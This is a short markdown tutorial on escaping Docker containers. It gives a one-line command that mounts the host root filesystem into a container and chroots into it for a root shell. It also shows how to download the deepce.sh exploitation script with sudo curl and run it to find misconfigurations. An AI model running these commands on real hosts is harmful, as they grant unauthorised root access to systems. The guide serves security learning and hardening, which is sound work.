# Container Hacking Techniques

- [Container Hacking Techniques](#container-hacking-techniques)
  - [Docker](#docker)
    - [Leveraging unsecure mount](#leveraging-unsecure-mount)
    - [Exploiting common missconfigurations - deepce.sh](#exploiting-common-missconfigurations---deepcesh)

## Docker

### Leveraging unsecure mount

As explained in [container-security-in-depth.md](../../container-security-in-depth.md), Docker group is sensitive and must be highly restricted, combined with secure policies restricting the mounts.

If not properly configured, this can be exploited by mounting the whole host filesystem into the container and then scaping with chroot capabilities. Check [docker - gtfobins](https://gtfobins.github.io/gtfobins/docker/) for further information.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![Unsecure mount](img/00-unsecure-mount.png)

### Exploiting common missconfigurations - deepce.sh

[Deepce](https://github.com/stealthcopter/deepce) is an interesting contribution from open source container focused in exploiting well known missconfigurations for escaping containers and escalating privileges.

To install it:

```bash
sudo curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /usr/local/bin/deepce.sh; sudo  chmod +x /usr/local/bin/deepce.sh
```

```bash
deepce.sh -e DOCKER
```

![Deepce](img/01-deepce-execution.png)

Following screenshot showcase possible exploitable paths to leverage access to the system. The last step is executing the exploit mentioned in [#leveraging-unsecure-mount](#leveraging-unsecure-mount).

